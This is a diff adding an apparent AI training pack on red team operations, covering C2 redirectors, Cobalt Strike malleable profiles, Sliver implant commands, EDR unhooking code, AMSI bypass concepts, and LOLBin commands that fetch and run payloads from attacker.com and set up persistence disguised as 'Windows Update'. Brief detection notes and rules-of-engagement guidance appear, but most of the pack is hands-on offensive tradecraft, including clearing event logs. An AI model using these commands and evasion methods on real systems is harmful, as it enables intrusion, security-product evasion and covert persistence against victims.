@@ -1,0 +1,382 @@
+================================================================================
+TITAN AI — TRAINING PACK 026: RED TEAM OPERATIONS
+C2 FRAMEWORKS, EVASION, LIVING OFF THE LAND, OPERATIONAL SECURITY
+================================================================================
+
+================================================================================
+PART 1: RED TEAM FUNDAMENTALS
+================================================================================
+
+--- RED TEAM VS PENETRATION TESTING ---
+
+PENETRATION TEST:
+  Scope: Specific systems, specific time window, specific methodology
+  Goal: Find as many vulnerabilities as possible in limited time
+  Mindset: Vulnerability discovery
+  Reporting: List of vulnerabilities with CVSS scores
+  
+RED TEAM OPERATION:
+  Scope: Objective-based (exfiltrate data, reach financial system, demonstrate full compromise)
+  Time: Weeks to months
+  Mindset: Real attacker — stealth, persistence, mission accomplishment
+  Methodology: Mirrors actual APT TTPs
+  Reporting: Attacked path narrative, dwell time, detection gaps found
+  
+  Key difference: A red team might intentionally NOT exploit a vulnerability
+  if doing so would cause detection that breaks the operation.
+  Goal is mission accomplishment, not vulnerability count.
+
+THE RED TEAM PLANNING CYCLE:
+  1. Rules of Engagement (ROE): What's in scope? What's off limits? Emergency contacts?
+     Critical: Out-of-scope systems clearly defined. Handling discovered evidence of
+     real attacker activity (pause operation, notify client immediately).
+  
+  2. Threat intelligence: Who would realistically attack this client?
+     Build adversary profile. Use that actor's real TTPs for simulation.
+  
+  3. Reconnaissance: External attack surface mapping (Pack 024 techniques).
+  
+  4. Initial access: Which vector matches threat actor and attack surface?
+  
+  5. Establish foothold: Persistence that survives reboots.
+  
+  6. Internal reconnaissance: Map internal network, find path to objective.
+  
+  7. Privilege escalation: Get to domain admin or equivalent.
+  
+  8. Lateral movement: Reach objective systems.
+  
+  9. Mission execution: Achieve objective (exfil data, reach critical system).
+  
+  10. Reporting: Full kill chain narrative. Map to MITRE ATT&CK. Detection gaps.
+
+================================================================================
+PART 2: COMMAND AND CONTROL (C2) INFRASTRUCTURE
+================================================================================
+
+--- C2 DESIGN PRINCIPLES ---
+
+C2 IS THE SPINE OF A RED TEAM OPERATION:
+  If C2 is detected: Operation over. All implants burned.
+  Design for: Resilience, stealth, operational security.
+
+TIERED C2 ARCHITECTURE:
+  
+  Tier 1: Short-haul (direct beacon to redirectors)
+  ┌────────────┐     HTTPS     ┌──────────────┐     Forward     ┌──────────────┐
+  │  Implant   │ ─────────────▶ │  Redirector  │ ──────────────▶ │  Team Server │
+  └────────────┘               │ (cloud VPS)  │                 │  (hidden)    │
+                                └──────────────┘
+  
+  Why redirectors:
+  - Implant's callback IP is redirector, not team server
+  - If redirector detected/blocked: Set up new redirector, update DNS
+  - Team server IP never exposed in implant or traffic
+  - Geographic plausibility (redirector in same country as target)
+  
+  Redirector types:
+  
+  Dumb pipe (nginx/socat):
+  # nginx redirector: Forward all traffic to team server
+  location / {
+      proxy_pass https://teamserver.attacker.com;
+      proxy_ssl_server_name on;
+      proxy_set_header Host $host;
+  }
+  
+  Smart redirector (checks before forwarding):
+  # Only forward traffic that looks like real implant traffic
+  # Block: Security researchers, scanners, threat intel crawlers
+  # Forward: Requests with valid malleable C2 headers
+  
+  location / {
+      if ($http_user_agent ~* "curl|wget|python|scanner") {
+          return 404;  # Looks like researcher/scanner - redirect to innocent site
+      }
+      if ($http_x_request_id = "") {
+          return 301 https://legitimate-looking-site.com;
+      }
+      proxy_pass https://teamserver:8443;
+  }
+
+--- COBALT STRIKE (industry standard, understand it) ---
+
+Cobalt Strike: Commercial red team platform. Widely used by red teams.
+Also: Cracked versions widely used by actual threat actors.
+Understanding it: Helps both offense and defense.
+
+KEY CONCEPTS:
+  
+  Listener: C2 channel configuration (protocol, host, port, SSL cert)
+  Payload/Beacon: Implant installed on target
+  Malleable C2: Profile that defines exactly how beacon traffic looks
+  Aggressor Scripts: Automation and customization language
+
+MALLEABLE C2 PROFILE (makes traffic look legitimate):
+  # Make beacon look like normal jQuery web requests
+  set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
+  
+  http-get {
+      set uri "/jquery-3.3.1.min.js";
+      
+      client {
+          header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
+          header "Referer" "https://code.jquery.com/jquery-3.3.1.min.js";
+          metadata {
+              base64url;
+              prepend "__cfduid=";
+              header "Cookie";
+          }
+      }
+      server {
+          header "Content-Type" "application/javascript; charset=utf-8";
+          output {
+              netbios;
+              prepend "/*! jQuery v3.3.1 | (c) JS Foundation ";
+              append " */";
+          }
+      }
+  }
+  
+  Result: Beacon traffic looks identical to fetching jQuery from CDN.
+  BLUE TEAM: Compare HTTP headers exactly to real jQuery requests.
+  Differences in headers, timing, response size = detection signal.
+
+--- SLIVER (OPEN SOURCE C2) ---
+
+Sliver: Modern open-source C2 framework. Cross-platform. Actively developed.
+
+  # Start Sliver server
+  ./sliver-server
+  
+  # Generate implant (HTTP beacon)
+  generate --http https://redirector.attacker.com --os windows --arch amd64 --format exe
+  
+  # Generate implant (DNS beacon — harder to detect, bypasses some proxies)
+  generate --dns c2.attacker.com --os windows
+  
+  # Generate stageless (larger but no staging traffic)
+  generate --http https://redirector.attacker.com --os windows --format shellcode
+  
+  # Start listener
+  http --lhost 0.0.0.0 --lport 8443
+  
+  # When implant connects:
+  use [session-id]
+  info                    # System info
+  ps                      # Process list
+  execute-assembly /path/to/SharpHound.exe -c All   # Run .NET assembly in memory
+  upload /path/to/file.exe C:\\Windows\\Temp\\svc.exe  # Upload file
+  execute-shellcode --pid 1234 /path/to/shellcode.bin  # Inject shellcode into process
+
+================================================================================
+PART 3: EVASION TECHNIQUES
+================================================================================
+
+--- ANTIVIRUS AND EDR EVASION ---
+
+HOW MODERN AV/EDR WORKS:
+  Signature-based: Hash or byte pattern matches known malware
+  Behavioral: Monitors process behavior (API calls, network, file operations)
+  Memory scanning: Scans process memory for known patterns
+  Kernel callbacks: Hooks process creation, thread creation, image load
+  AMSI: Anti-Malware Scan Interface (PowerShell, VBScript scanned before execution)
+
+EVASION CATEGORIES:
+
+1. Signature Evasion:
+  Change bytes to break hash/byte-pattern matching.
+  a) Source code modifications: Change variable names, logic flow
+  b) Packing/encryption: Encrypt payload, decrypt at runtime (AV scans at rest)
+  c) Shellcode encoding: Vary encoding each generation
+  d) Cobalt Strike OPSEC: Avoid default config that security products fingerprint
+  
+  Tool: SRDI (Shellcode Reflective DLL Injection) + encryption
+  Tool: Donut (converts .NET assembly to shellcode with encryption)
+
+2. Memory Evasion:
+  Unhooking: AV products hook ntdll.dll functions. Read clean copy from disk.
+  
+  // Unhooking ntdll.dll:
+  HANDLE hFile = CreateFileW(L"C:\\Windows\\System32\\ntdll.dll", 
+    GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+  // Map the file from disk
+  HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY|SEC_IMAGE, 0, 0, NULL);
+  LPVOID pMapping = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
+  // Overwrite in-memory ntdll with clean copy from disk
+  // AV hooks in memory are now bypassed by direct syscalls
+  
+  Syscall direct: Bypass hooks entirely by calling kernel syscalls directly.
+  ntdll provides syscall wrappers. Hooks are in ntdll.
+  Direct syscall: Skip ntdll, call kernel directly.
+  Tools: SysWhispers, HellsGate, TartarusGate
+
+3. AMSI Bypass:
+  AMSI: Scans scripts before execution. PowerShell, VBScript, JScript.
+  Bypass: Corrupt AMSI context in memory before executing malicious script.
+  
+  # Classic (many AV products now detect these, for education only):
+  # Patch amsi.dll AmsiScanBuffer function to always return AMSI_RESULT_CLEAN
+  
+  # Less detected: Forked from attacker's operational tooling
+  # The cat-and-mouse game: Defenders add detection, attackers mutate bypass.
+
+4. EDR Behavioral Evasion:
+  EDR monitors: CreateRemoteThread, VirtualAllocEx, WriteProcessMemory (injection APIs)
+  Evasion: Use uncommon injection techniques
+  
+  Process Hollowing: Create suspended process, replace memory with payload
+  Atom Bombing: Use Windows Atom Table to write shellcode
+  Process Doppelgänging: Use transactions to write to process image
+  Module Stomping: Overwrite legitimate loaded DLL with payload
+  
+  Each technique bypasses different EDR behavioral rules.
+  Red teamers test each against target's specific EDR product.
+
+================================================================================
+PART 4: LIVING OFF THE LAND (LOTL)
+================================================================================
+
+--- LOLBINS (LIVING OFF THE LAND BINARIES) ---
+
+CONCEPT: Use legitimate Windows binaries for attacker purposes.
+These binaries are trusted, signed by Microsoft, whitelisted by most products.
+Using them: Attacker activities blend into normal operations.
+
+FILE DOWNLOAD:
+  # certutil (certificate utility — downloads files as a feature)
+  certutil -urlcache -f http://attacker.com/payload.exe C:\Windows\Temp\payload.exe
+  
+  # bitsadmin (Background Intelligent Transfer Service)
+  bitsadmin /transfer job /download /priority normal http://attacker.com/payload.exe C:\Windows\Temp\payload.exe
+  
+  # PowerShell (when allowed)
+  powershell -c "Invoke-WebRequest -Uri http://attacker.com/payload.exe -OutFile C:\Windows\Temp\payload.exe"
+  
+  # mshta (HTML Application Host)
+  mshta http://attacker.com/payload.hta  # Executes HTA file (JScript/VBScript)
+
+CODE EXECUTION:
+  # regsvr32 (DLL registration — can execute code in DLL or from URL)
+  regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll
+  
+  # msiexec (installer — can execute from URL)
+  msiexec /q /i http://attacker.com/payload.msi
+  
+  # wmic (WMI command line)
+  wmic process call create "C:\Windows\Temp\payload.exe"
+  wmic /node:target_ip process call create "C:\Windows\Temp\payload.exe"  # Remote execution
+  
+  # rundll32 (run DLL function)
+  rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"cmd /c ...\")");
+  
+  # PsExec-style with wmic:
+  wmic /node:192.168.1.50 /user:admin /password:pass process call create "cmd /c whoami > C:\output.txt"
+
+PERSISTENCE LOLBINS:
+  # schtasks (scheduled tasks)
+  schtasks /create /sc minute /mo 5 /tn "Windows Update" /tr "C:\Windows\Temp\payload.exe" /ru SYSTEM
+  
+  # reg (registry — add autorun)
+  reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Windows Update" /t REG_SZ /d "C:\Windows\Temp\payload.exe"
+  
+  # sc (service control — create service)
+  sc create WindowsUpdate binPath= "C:\Windows\Temp\payload.exe" start= auto
+  sc start WindowsUpdate
+
+DETECTION BY BLUE TEAM:
+  These are known and monitored. Detection examples:
+  
+  certutil downloading executables: 
+  alert: certutil.exe → network connection + file creation with .exe extension
+  
+  mshta connecting to internet:
+  alert: mshta.exe → network connection to external IP
+  
+  wmic creating remote processes:
+  alert: wmic.exe with /node: parameter + process call create = lateral movement
+  
+  Best defense: WDAC (Windows Defender Application Control) or AppLocker
+  Block known LOLBIN abuse patterns while allowing legitimate use.
+
+================================================================================
+PART 5: OPERATIONAL SECURITY (OPSEC)
+================================================================================
+
+--- OPSEC FOR RED TEAMS ---
+
+THE OPSEC PROCESS (originally US military doctrine):
+  1. Identify critical information (what, if known by adversary, would compromise the operation?)
+  2. Analyze threats (who wants to discover? What are their capabilities?)
+  3. Analyze vulnerabilities (how could our critical info be exposed?)
+  4. Assess risk (likelihood × impact for each vulnerability)
+  5. Apply countermeasures
+
+RED TEAM OPSEC FAILURES (common and avoidable):
+
+Failure 1: Reusing infrastructure
+  Same C2 IP used across multiple engagements.
+  Blue team: Recognizes IP from previous engagement. Operation burned.
+  Fix: Fresh VPS for every engagement. Burn infrastructure after each operation.
+
+Failure 2: Weak OPSEC in recon phase
+  Scanning target from personal IP or office IP.
+  Blue team: Logs show attacker's IP. Attribution trivial.
+  Fix: Route all recon through dedicated OPSEC'd infrastructure.
+
+Failure 3: Default tool signatures
+  Using default Cobalt Strike configuration.
+  Default: Same malleable C2 profile, default beacon timing (60 seconds), default user-agent.
+  Blue team: Products fingerprint default Cobalt Strike trivially.
+  Fix: Custom malleable C2 profile. Randomized jitter (beacon interval ± 30-60 seconds).
+
+Failure 4: Leaving artifacts
+  Tool output files left on target systems.
+  SharpHound output left in C:\Temp. BloodHound data on target disk.
+  Blue team: Forensics finds artifacts. Pivot point discovered. Operation scope revealed.
+  Fix: Clean up after every action. Immediate removal of tool outputs.
+  
+  Cleanup checklist after every operation step:
+  □ Remove uploaded tools from disk
+  □ Remove output files
+  □ Clear relevant event logs (where possible)
+  □ Remove scheduled tasks created
+  □ Remove services created
+  □ Remove registry keys added
+
+Failure 5: Excessive noise
+  Running loud scanners (nmap, masscan) from compromised host.
+  Triggers IDS/IPS alerts. Operation burned.
+  Fix: Targeted scanning only. Use AD/WMI for internal enumeration instead of network scans.
+  BloodHound collection is much stealthier than nmap for AD environments.
+
+Failure 6: Phoning home at predictable intervals
+  Beacon with no jitter: Connects every 60 seconds exactly.
+  Network analysis: Perfect 60-second intervals = automated C2 beacon.
+  Fix: Jitter. Beacon ± 50% random: 30-90 seconds. Harder to identify as automated.
+
+--- RULES OF ENGAGEMENT ESSENTIALS ---
+
+GET EVERYTHING IN WRITING:
+  Scope: Exact IP ranges, domains, systems included and excluded.
+  Authorized techniques: Phishing? Physical? Social engineering?
+  Notification requirements: Escalation path when critical system at risk.
+  Emergency contacts: Blue team lead's phone number. Use when unexpected critical finding.
+  Deconfliction: Process for blue team to verify if activity is red team vs. real attacker.
+  Evidence handling: What to do if you find evidence of a real ongoing breach.
+
+DECONFLICTION PROCESS:
+  Blue team detects suspicious activity. Needs to know: Us or real attacker?
+  System: Red team registers each operation by code word or hash.
+  Blue team: Queries system with observed indicators.
+  System: Returns "This is red team, operation [codename], user [operator]"
+  Blue team: Can verify without alerting red team (and vice versa).
+
+================================================================================
+END OF PACK 026: RED TEAM OPERATIONS
+Total: Red team vs pentest philosophy, planning cycle, C2 architecture (tiered
+redirectors, nginx smart redirectors), Cobalt Strike malleable C2 concepts,
+Sliver usage, AV/EDR evasion (signature/memory/AMSI/behavioral), LOLBINS
+(download/execution/persistence with detection context), OPSEC process,
+common OPSEC failures with fixes, rules of engagement and deconfliction.
+================================================================================
